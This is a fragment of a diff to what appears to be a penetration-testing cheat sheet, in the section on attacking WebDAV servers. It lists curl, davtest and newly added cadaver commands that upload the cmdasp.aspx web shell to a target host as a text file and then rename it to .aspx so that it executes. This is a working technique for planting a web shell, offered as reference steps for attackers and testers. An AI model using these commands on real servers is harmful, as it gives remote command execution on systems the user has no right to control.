@@ -74,6 +74,9 @@ $ curl -X PUT http://<IP address>/test.txt --data-binary @cmdasp.aspx
 $ curl -X PUT http://<IP address>/test.txt -d @cmdasp.aspx 
 $ curl -X MOVE -H 'Destination:http://<IP address>/cmdasp.aspx' http://<IP address>/test.txt
 $ davtest -url http://<IP address>
+$ cadaver http://<IP address>
+dav:/ put cmdasp.aspx cmdasp.txt
+dav:/ put cmdasp.txt cmdasp.aspx
 ```
 
 - SNMP (udp/port 161)
